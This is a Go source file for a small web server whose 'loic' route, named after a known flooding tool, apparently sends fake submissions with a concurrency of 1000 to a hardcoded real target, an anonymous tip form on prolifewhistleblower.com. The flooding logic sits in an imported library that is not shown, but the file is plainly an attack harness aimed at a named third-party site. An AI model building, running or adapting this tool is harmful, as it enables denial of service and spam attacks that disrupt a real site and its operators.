package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"

	"github.com/gorilla/mux"
	"github.com/guygrigsby/peashooter"
	"github.com/sirupsen/logrus"
)

const (
	DEFAULT_CONCURRENCY = 1000
)

func main() {
	f, err := os.Open("public/index.html")
	if err != nil {
		panic(err)
	}
	index, err := io.ReadAll(f)
	if err != nil {
		panic(err)
	}
	var (
		concurrency int
		log         = logrus.New()
		ctx         = context.Background()
		formURL     = "https://prolifewhistleblower.com/anonymous-form/"
		//req := http.NewRequest()
	)
	c, err := strconv.ParseInt(os.Getenv("PEASHOOTER_CONCURRENCY"), 10, 16)
	if err != nil {

		concurrency = DEFAULT_CONCURRENCY
	} else {
		concurrency = int(c)
	}
	r := mux.NewRouter()
	r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		_, err := w.Write(index)
		if err != nil {
			http.Error(w, "Cannot open index.html", http.StatusInternalServerError)
			return
		}
	})
	r.HandleFunc("loic", LOICHandler(ctx, formURL, concurrency, log.WithField("service", "peashooter")))
	r.Handle("/", http.FileServer(http.Dir("../frontend/build")))
	http.Handle("/", r)

	if err := http.ListenAndServe(":3000", r); err != nil {
		log.WithField("error", err).Error("Server Failure")
	}

}

func LOICHandler(ctx context.Context, uri string, concurrency int, log *logrus.Entry) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {

		res, err := peashooter.Fake(ctx, uri, r, concurrency, log)
		if err != nil {
			http.Error(w, "cannot init paeashooter", http.StatusInternalServerError)
			return
		}
		fmt.Printf("%+v", res)
	}
}
